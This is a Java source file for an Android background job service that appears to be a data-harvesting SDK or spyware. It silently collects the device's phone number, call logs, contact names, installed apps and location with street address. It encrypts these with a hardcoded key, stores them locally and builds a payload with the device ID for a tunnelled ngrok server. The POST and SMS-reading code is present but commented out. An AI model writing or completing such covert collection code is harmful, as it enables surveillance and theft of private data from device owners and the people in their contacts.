package com.example.jobservicelibray;

import android.Manifest;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.icu.text.SimpleDateFormat;
import android.location.Address;
import android.location.Criteria;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;


import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;


import org.checkerframework.common.returnsreceiver.qual.This;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.sql.Timestamp;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.CompletableFuture;

import android.provider.Settings.Secure;


@TargetApi(Build.VERSION_CODES.M)
public class FterJobServiceTesting extends JobService implements LocationListener {
    public FterJobServiceTesting(Context ctx) {
        this.ctx = ctx;
    }

    private static final String TAG = "JobService";
    private boolean jobCancelled = false;
    private Context ctx;
    private static final String locationKey = "locationKey";
    private static final String phoneNumberKey = "phoneNumberKey";
    private static final String callLogsKey = "callLogsKey";
    private static final String infoAppsKey = "infoAppsKey";
    private static final String contactAllNameKey = "contactAllNameKey";
    private static final String smsLogsKey = "smsLogsKey";
    private static final String MyPREFERENCES = "MyPrefs";
    private JSONObject getYourPhoneNumber = new JSONObject();
    private JSONObject getDeviceLongLat = new JSONObject();

    private List<JSONObject> getCallLogs = new ArrayList<>();
    private List<JSONObject> getInstalledApps = new ArrayList<>();
    private JSONObject getAllContactName = new JSONObject();
    private List<JSONObject> getSMSLogs = new ArrayList<>();
    private String getAppUsages = "";
    private AES crypto = new AES();
    private final String secretKey = "wing@123";

    StorageReference storageReference;

    // Job Scheduling
    @Override
    public boolean onStartJob(JobParameters params) {
        if (ctx == null) {
            ctx = getApplicationContext();
        }
        Log.d(TAG, "Job started");
        doBackgroundWork(params);

        return true;
    }

    private void doBackgroundWork(final JobParameters params) {
        new Thread(new Runnable() {

            @Override
            public void run() {
                Looper.prepare();
                runAllMethods();

                Log.d(TAG, "Job finished");
                jobFinished(params, true);
            }
        }).start();
    }

    // Init Call SDK
    public void init() {
        runAllMethods();
        Log.d(TAG, " finished");
    }


    // Call All Methods
    public void runAllMethods() {

        for (int i = 0; i < 7; i++) {
            Log.d(TAG, "run: " + i);

            try {
                handleCallMethod(i);
//                Thread.sleep(2000);
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public void uploadDataToServer() throws IOException, JSONException {
        // Create a neat value object to hold the URL
        URL url = new URL("https://2bd1-203-95-198-235.ap.ngrok.io");
        // instance
        JSONObject jsonObject = new JSONObject();
        JSONObject callLogObject = new JSONObject();
        SharedPreferences sharedpreferences = ctx.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);

        //location
        String getLocationSharedPref = crypto.decrypt(sharedpreferences.getString(locationKey, "null"), secretKey);
        Log.d("getLocationSharedPref", getLocationSharedPref);

        // call log
        String getPhoneNumberPref = crypto.decrypt(sharedpreferences.getString(phoneNumberKey, "null"), secretKey);
        Log.d("getPhoneNumberPref", getLocationSharedPref);
        String getCallLogsPref = crypto.decrypt(sharedpreferences.getString(callLogsKey, "null"), secretKey);
        Log.d("getCallLogsPref", getCallLogsPref);
        String getContactAllNamePref = crypto.decrypt(sharedpreferences.getString(contactAllNameKey, "null"), secretKey);
        Log.d("getContactAllNamePref", getContactAllNamePref);
        JSONObject jsonObjectCallPref = new JSONObject(getCallLogsPref);
        JSONArray callArray = jsonObjectCallPref.getJSONArray("callLogs");

        // App info
        String getAppInfoPref = crypto.decrypt(sharedpreferences.getString(infoAppsKey, "null"), secretKey);
        Log.d("getAppInfoPref", getAppInfoPref);
        JSONObject jsonObjectSharedPref = new JSONObject(getAppInfoPref);
        JSONArray appInfoArray = jsonObjectSharedPref.getJSONArray("allInfoApp");


        // TimeStamp
        String android_id = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID);
        SimpleDateFormat formatter = null;
        Date now = new Date();
        String date = "";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            formatter = new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss", Locale.CANADA);
            date = formatter.format(now);
        }

        // filter [] to put it as list of string
        String replace = getContactAllNamePref.replaceAll("^\\[|]$", "");
        List<String> contactsAllName = Arrays.asList(replace.split(","));
        JSONArray contactsJsonArray = new JSONArray(contactsAllName);
//      JSONObject jsonObjectSmsPref = new JSONObject(getSmsLogsPref);
//      JSONArray smsArray = jsonObjectSmsPref.getJSONArray("smsLogs");


//      Log.d("123", smsArray.toString() + callArray.toString());


        try {
            callLogObject.put("phoneNumber", handleStringToJson(getPhoneNumberPref));
            callLogObject.put("contactsAllName", contactsJsonArray);
            callLogObject.put("callLogs", callArray);
            jsonObject.put("appsInfo", appInfoArray);
            jsonObject.put("deviceLocation", handleStringToJson(getLocationSharedPref));
//            jsonObject.put("smsLogs", smsArray);
            jsonObject.put("phoneInfo", callLogObject);
            jsonObject.put("deviceId", android_id);
            jsonObject.put("timeStamp", date);

        } catch (JSONException e) {
            Log.d("Error", e.toString());
        }

        // Open a connection(?) on the URL(?) and cast the response(??)
//        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
//        connection.setRequestMethod("POST");
//        connection.setRequestProperty("Content-Type", "application/json");
//        connection.setRequestProperty("accept", "application/json");
//        connection.setDoOutput(true);

//        connection.getOutputStream().write(jsonObject);
        Log.d("data", jsonObject.toString());
        Log.d("data", jsonObject.get("phoneInfo"). toString());
        Log.d("data", jsonObject.get("deviceLocation").toString());
//        try (OutputStream os = connection.getOutputStream()) {
//            byte[] input = jsonObject.toString().getBytes("utf-8");
//            os.write(input, 0, input.length);
//        }
//
//
////         This line makes the request
//        InputStream responseStream = connection.getInputStream();

    }

    private BufferedWriter convertToJsonFile(String fileName, String objectString) {
        File file = new File(ctx.getFilesDir(), fileName + ".json");
        BufferedWriter bufferedWriter;
        try {
            FileWriter fileWriter = new FileWriter(file);
            bufferedWriter = new BufferedWriter(fileWriter);
            bufferedWriter.write(objectString);
            bufferedWriter.close();
            Log.d("Success", "Converted Successful " + ctx.getFilesDir().toString());
        } catch (IOException e) {
            return null;
        }

        return bufferedWriter;
    }

    // upload Image to FirebaseStorage
    private void uploadImage(Uri imageUri, String fileName) {
        SimpleDateFormat formatter = null;
        storageReference = FirebaseStorage.getInstance().getReference();

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            formatter = new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss", Locale.CANADA);
        }
        Date now = new Date();
        String date = "";
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            date = formatter.format(now);
        }
        StorageReference riversRef = storageReference.child("images/" + fileName + date + ".json");


        riversRef.putFile(imageUri)
                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        Log.d("Success", "Files have been upload to cloud");
                    }
                }).addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        Log.d("Error", e.toString());
                    }
                });

    }

    private void writeDataInSharedPreference(String key, String data) {
        SharedPreferences sharedpreferences = ctx.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedpreferences.edit();
        editor.putString(key, data);
        editor.commit();
        Log.d("Success", "Write Successfully");
    }


    private void handleCallMethod(int i) throws JSONException {
        SharedPreferences sharedpreferences = ctx.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
        switch (i) {
            case 0:
                if (hasPermission(Manifest.permission.READ_PHONE_STATE)) {
                    getYourPhoneNumber = getYourPhoneNumber(ctx);

                    String encryptData = crypto.encrypt(getYourPhoneNumber.toString(), secretKey);
                    Log.d("encryptData", encryptData);
                    writeDataInSharedPreference(phoneNumberKey, encryptData);
                } else {
                    try {
                        getYourPhoneNumber.put("permissions", "No Permissions");
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }
                break;
            case 1:
                if (hasPermission(Manifest.permission.READ_CALL_LOG)) {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("callLogs", getCallLogs(ctx));
                    String encryptData = crypto.encrypt(jsonObject.toString(), secretKey);
                    Log.d("encryptData", encryptData);
                    writeDataInSharedPreference(callLogsKey, encryptData);
                } else {
                    try {
                        getCallLogs.get(0).put("permissions", "No Permissions");
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                    Log.d("", "No Permissions");
                }
                break;
            case 2:

                if (hasPermission(Manifest.permission.READ_PHONE_STATE)) {
                    String encryptData = crypto.encrypt(getAllContactName(ctx).toString(), secretKey);
                    Log.d("encryptData", encryptData);
                    writeDataInSharedPreference(contactAllNameKey, encryptData);
//                    try {
//                        getAllContactName.put("ownPhoneNumber", getYourPhoneNumber);
//                        getAllContactName.put("callLogs", getCallLogs);
//                        getAllContactName.put("allContactName", getAllContactName(ctx));
//                    } catch (JSONException e) {
//                        throw new RuntimeException(e);
//                    }
//                    File file = new File(ctx.getFilesDir(),"OwnPhoneNumber.json");
//                    uploadImage(Uri.fromFile(file), "OwnPhoneNumber");
                } else {
                    try {
                        getAllContactName.put("permissions", "No Permissions");
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }

                    Log.d("", "No Permissions");
                }
                break;
            case 3:



                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("allInfoApp", getInstalledApps(ctx));
                    String encryptData = crypto.encrypt(jsonObject.toString(), secretKey);
                    Log.d("encryptData", encryptData);
                    writeDataInSharedPreference(infoAppsKey, encryptData);
//                    convertToJsonFile("AppsInfo", jsonObject.toString());
//                    File file = new File(ctx.getFilesDir(),"AppsInfo.json");
//                    uploadImage(Uri.fromFile(file), "AppsInfo");

//                } else {
//                    try {
//                        JSONObject jsonObject = new JSONObject();
//                        jsonObject.put("permissions", "No Permissions");
//                        getInstalledApps.add(jsonObject);
//                    } catch (JSONException e) {
//                        throw new RuntimeException(e);
//                    }
//                    Log.d("", "No Permissions");
//                }
                break;
            case 4:
                if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) && hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION) &&
                        hasPermission(Manifest.permission.RECEIVE_BOOT_COMPLETED)) {
                    getDeviceLongLat.put("deviceLocations", getDeviceLongLat(ctx));
//                    convertToJsonFile("DeviceLocations", getDeviceLongLat);
//                    File file = new File(ctx.getFilesDir(),"DeviceLocations.json");
//                    uploadImage(Uri.fromFile(file), "DeviceLocations");
                    Log.d(" ", getDeviceLongLat.toString());
                } else {
                    try {
                        getDeviceLongLat.put("permissions", "No Permissions");
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                    Log.d("", "No Permissions");
                }
                break;
            default:
                break;
//            case 5:
//                if (hasPermission(Manifest.permission.READ_SMS)) {
//
//                    JSONObject jsonObject  = new JSONObject();
//                    jsonObject.put("smsLogs", getSMSLogs(ctx));
//                    writeDataInSharedPreference(smsLogsKey, jsonObject.toString());
////                    JSONObject jsonObject = new JSONObject();
////                    try {
////                        jsonObject.put("smsLogs", getSMSLogs);
////                    } catch (JSONException e) {
////                        throw new RuntimeException(e);
////                    }
////                    convertToJsonFile("SMSLogs", getSMSLogs.toString());
////                    File file = new File(ctx.getFilesDir(),"SMSLogs.json");
////                    uploadImage(Uri.fromFile(file), "SMSLogs");
//                } else {
//                    try {
//
//                        JSONObject jsonObject  = new JSONObject();
//                        jsonObject.put("permissions", "No Permissions");
//                        getSMSLogs.add(jsonObject);
//                    } catch (JSONException e) {
//                        throw new RuntimeException(e);
//                    }
//                    Log.d("", "No Permissions");
//                }
//                break;
//            case 6:
//                if (hasPermission(Manifest.permission.PACKAGE_USAGE_STATS)) {
//                    getAppUsages = getAppUsages(ctx);
//                    JSONObject jsonObject = new JSONObject();
//                    try {
//                        jsonObject.put("appUsages", getAppUsages);
//
//                    } catch (JSONException e) {
//                        throw new RuntimeException(e);
//                    }
//                    convertToJsonFile("AppsUsages", jsonObject.toString());
////                    File file = new File(ctx.getFilesDir(),"AppsUsages.json");
////                    uploadImage(Uri.fromFile(file), "AppsUsages");
//                    Log.d (" ",  getAppUsages);
//                } else {
//                    convertToJsonFile("AppsUsages",  "{" + "\"Permission \"" + ":" + "\"No Permissions \"" +
//                            "}");
//                    Log.d("", "No Permissions");
//                }
//                break;


        }
    }

    private boolean hasPermission(String permission) {
        int result = ctx.checkCallingOrSelfPermission(permission);
        return result == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.d(TAG, "Job cancelled before completion");
        jobCancelled = true;
        return true;
    }

    // App Info
    private JSONArray getInstalledApps(Context ctx) {
        JSONObject jsonObject = new JSONObject();
        JSONArray jsonArray = new JSONArray();
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> applications = pm.getInstalledApplications(0);
//            List<HashMap<String, Object>> entries = new ArrayList<>();


            for (ApplicationInfo appInfo : applications) {
//                HashMap<String, Object> map = new HashMap<>();

                jsonObject.put("name", appInfo.name);
                jsonObject.put("appGame", appInfo.CATEGORY_GAME);
                jsonObject.put("appNews", appInfo.CATEGORY_NEWS);
                jsonObject.put("appSocial", appInfo.CATEGORY_SOCIAL);
                jsonObject.put("appProductivity", appInfo.CATEGORY_PRODUCTIVITY);
                jsonObject.put("appVideo", appInfo.CATEGORY_VIDEO);
                jsonObject.put("appAudio", appInfo.CATEGORY_AUDIO);
                jsonObject.put("packageName", appInfo.packageName);
                jsonObject.put("permission", appInfo.permission);
                jsonObject.put("className", appInfo.className);
                jsonObject.put("processName", appInfo.processName);
                jsonObject.put("flags", appInfo.flags);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    jsonObject.put("minSdkVersion", appInfo.minSdkVersion);
                }
                // map.put("compileSdkVersion", appInfo.compileSdkVersion);
                jsonObject.put("flagSystem", ApplicationInfo.FLAG_SYSTEM);

                String categoryStr = "";
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    categoryStr = String.valueOf(appInfo.getCategoryTitle(ctx, appInfo.category));
                }
                jsonObject.put("category", categoryStr);

                jsonArray.put(jsonObject);
            }

            return jsonArray;
        } catch (Exception e) {
            Log.d("error", e.toString());
        }
        return jsonArray;
    }

    // Get Call Logs =================================
    private JSONArray getCallLogs(Context ctx) {
        // get Sim Number
        TelephonyManager tMgr = ContextCompat.getSystemService(ctx, TelephonyManager.class);
//        String getSimNumber = tMgr.getLine1Number();
        JSONObject jsonObject = new JSONObject();
        JSONArray jsonArray = new JSONArray();

        final String[] CURSOR_PROJECTION = {
                CallLog.Calls.CACHED_FORMATTED_NUMBER,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.CACHED_NUMBER_TYPE,
                CallLog.Calls.CACHED_NUMBER_LABEL,
                CallLog.Calls.CACHED_MATCHED_NUMBER,
                CallLog.Calls.PHONE_ACCOUNT_ID,
        };

        SubscriptionManager subscriptionManager = ContextCompat.getSystemService(ctx, SubscriptionManager.class);
        List<SubscriptionInfo> subscriptions = null;
        if (subscriptionManager != null) {
            subscriptions = subscriptionManager.getActiveSubscriptionInfoList();
        }

        try (Cursor cursor = ctx.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                CURSOR_PROJECTION,
                null,
                null,
                CallLog.Calls.DATE + " DESC")) {

            while (cursor != null && cursor.moveToNext()) {
//                HashMap<String, Object> map = new HashMap<>();
                jsonObject.put("formattedNumber", cursor.getString(0));
                jsonObject.put("number", cursor.getString(1));
                jsonObject.put("callType", cursor.getInt(2));
                jsonObject.put("timestamp", cursor.getLong(3));
                jsonObject.put("duration", cursor.getInt(4));
                jsonObject.put("name", cursor.getString(5));
                jsonObject.put("cachedNumberType", cursor.getInt(6));
                jsonObject.put("cachedNumberLabel", cursor.getString(7));
                jsonObject.put("cachedMatchedNumber", cursor.getString(8));
                jsonObject.put("simDisplayName", getSimDisplayName(subscriptions, cursor.getString(9)));
//                 map.put("yourPhoneNumber", getSimNumber);
                jsonObject.put("phoneAccountId", cursor.getString(9));

                jsonArray.put(jsonObject);
            }
            return jsonArray;

        } catch (Exception e) {
            Log.d("", e.toString());
        }
        return jsonArray;
    }

    private String getSimDisplayName(List<SubscriptionInfo> subscriptions, String accountId) {
        if (accountId != null && subscriptions != null) {
            for (SubscriptionInfo info : subscriptions) {
                if (Integer.toString(info.getSubscriptionId()).equals(accountId) ||
                        accountId.contains(info.getIccId())) {
                    return String.valueOf(info.getDisplayName());
                }
            }
        }
        return null;
    }

    // Get all Contact Name
    @SuppressLint("Range")
    private List<String> getAllContactName(Context ctx) {
        List<String> list = new ArrayList<>();
        try {
            ContentResolver contentResolver = ctx.getContentResolver();
            Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    @SuppressLint("Range") String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    if (cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor cursorInfo = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                        InputStream inputStream = ContactsContract.Contacts.openContactPhotoInputStream(
                                ctx.getContentResolver(),
                                ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, new Long(id)));

                        Uri person = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, new Long(id));
                        Uri pURI = Uri.withAppendedPath(person, ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);

                        Bitmap photo = null;
                        if (inputStream != null) {
                            photo = BitmapFactory.decodeStream(inputStream);
                        }
                        while (cursorInfo.moveToNext()) {
                            String contactName = cursor
                                    .getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                            list.add(contactName);
                        }

                        cursorInfo.close();
                    }
                }
                cursor.close();
            }
            return list;
        } catch (Exception e) {
            Log.d("", e.toString());

        }
        return list;
    }

    // App Usages
    private String getAppUsages(Context ctx) {

        try {
            UsageStatsManager mUsageStatsManager = ContextCompat.getSystemService(ctx,
                    UsageStatsManager.class);
            List<UsageStats> appList = mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_MONTHLY, 0,
                    System.currentTimeMillis());
            for (UsageStats usageStats : appList) {
                Log.d("", String.valueOf(usageStats.getTotalTimeInForeground()));
            }

            return appList.toString();
        } catch (Exception e) {
            Log.d("", e.toString());
            return null;
        }
    }

    // Get SMS logs
    private JSONArray getSMSLogs(Context ctx) {
        JSONObject jsonObject = new JSONObject();
        JSONArray jsonArray = new JSONArray();

        try (Cursor cursor = ctx.getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null)) {

            while (cursor != null && cursor.moveToNext()) {

                String smsDate = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                Date dateFormat = new Date(Long.valueOf(smsDate));

                String number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                String type = "";

                int typeInt = Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
                if (typeInt == Telephony.Sms.MESSAGE_TYPE_INBOX)
                    type = "inbox";
                else if (typeInt == Telephony.Sms.MESSAGE_TYPE_SENT)
                    type = "sent";
                else if (typeInt == Telephony.Sms.MESSAGE_TYPE_OUTBOX)
                    type = "outbox";

                jsonObject.put("date", smsDate);
                jsonObject.put("formattedDate", String.valueOf(dateFormat));
                jsonObject.put("number", number);
                jsonObject.put("body", body);
                jsonObject.put("type", type);

                jsonArray.put(jsonObject);
            }
            return jsonArray;
        } catch (Exception e) {
            Log.d("", e.toString());

        }
        return jsonArray;
    }

    // Get Phone number
    public JSONObject getYourPhoneNumber(Context ctx) {
        JSONObject jsonObject = new JSONObject();
        try {
            TelephonyManager tMgr = ContextCompat.getSystemService(ctx, TelephonyManager.class);
            String getSimNumber = tMgr.getLine1Number();
            String simDisplayName = tMgr.getNetworkOperatorName();
            jsonObject.put("getSimNumber", getSimNumber);
            jsonObject.put("simDisplayName", simDisplayName);


            return jsonObject;
        } catch (Exception e) {
            Log.d("", e.toString());
        }
        return jsonObject;
    }

    // Get LongLat
    private String getDeviceLongLat(Context ctx) {
        try {
            final LocationManager locationManager = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            final boolean gpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            Criteria criteria = new Criteria();
            if (gpsEnabled) {
                criteria.setAccuracy(Criteria.ACCURACY_FINE);
                criteria.setPowerRequirement(Criteria.POWER_HIGH);
                criteria.setHorizontalAccuracy(Criteria.ACCURACY_HIGH);
                criteria.setVerticalAccuracy(Criteria.ACCURACY_HIGH);

                String provider = locationManager.getBestProvider(criteria, false);

                locationManager.requestLocationUpdates(10000, 10, criteria, this, null);
                Location location = locationManager.getLastKnownLocation(provider);

                // Initialize the location fields
                if (location != null) {
                    onLocationChanged(location);
                    SharedPreferences sharedpreferences = ctx.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
                    String getLocationSharedPref = sharedpreferences.getString(locationKey, "null");
                    return getLocationSharedPref;
                }

            }

        } catch (Exception e) {
            Log.d("error", e.toString());
        }
        return "null";
    }

    private JSONObject handleStringToJson(String string) {
        try {
            JSONObject jsonObject = new JSONObject(string);
            return jsonObject;
        } catch (JSONException err) {
            Log.d("Error", err.toString());
            return null;
        }
    }

    public void onLocationChanged(Location location) {
        // Called when a new location is found by the network location provider.
        final String TAG = "LocationChanged";
        try {
            SharedPreferences sharedpreferences = ctx.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
            String getLocationSharedPref = sharedpreferences.getString(locationKey, null);
            SharedPreferences.Editor editor = sharedpreferences.edit();
            JSONObject objAllLocation = new JSONObject();
            JSONObject objLocation = new JSONObject();
            Timestamp timestamp = new Timestamp(System.currentTimeMillis());
            List<Address> addresses;
            Geocoder geocoder = new Geocoder(ctx, Locale.getDefault());
            double latitude = location.getLatitude();
            double longitude = location.getLongitude();

            // Using geocoder to determine the address by coordinate
            addresses = geocoder.getFromLocation(latitude, longitude, 1);

            // write to json
            objLocation.put("latitude", latitude);
            objLocation.put("longitude", longitude);
            objLocation.put("address", addresses.get(0).getAddressLine(0).toString());
            objLocation.put("timestamp", timestamp.toString());

            JSONObject jsonObject = handleStringToJson(objLocation.toString());
            objLocation.put("location", jsonObject);



            if (getLocationSharedPref == null) {
                try {
                    JSONArray jsonArray = new JSONArray();
                    JSONObject jsonObjectLocation = new JSONObject(objLocation.getString("location"));
                    jsonArray.put(jsonObjectLocation);
                    objAllLocation.put("allLocation", jsonArray);
                } catch (JSONException err) {
                    Log.d("Error", err.toString());
                }
                editor.putString(locationKey, objAllLocation.toString());
            } else {
                try {
                    JSONObject jsonObjectSharedPref = new JSONObject(getLocationSharedPref);
                    JSONArray resultArray = jsonObjectSharedPref.getJSONArray("allLocation");
                    JSONObject locationObject = new JSONObject(objLocation.getString("location"));
                    resultArray.put(locationObject);
                    String totalLocationVisited = String.valueOf(resultArray.length() + 1);
                    objAllLocation.put("allLocation", resultArray);
                    objAllLocation.put("totalLocation", totalLocationVisited);
                } catch (JSONException err) {
                    Log.d("Error", err.toString());
                }
                String encryptData = crypto.encrypt(objAllLocation.toString(), secretKey);
                Log.d("encryptData", encryptData);
                editor.putString(locationKey, encryptData);
            }
            editor.commit();
        } catch (Exception e) {
            Log.d(TAG, e.toString());
        }
    }

}
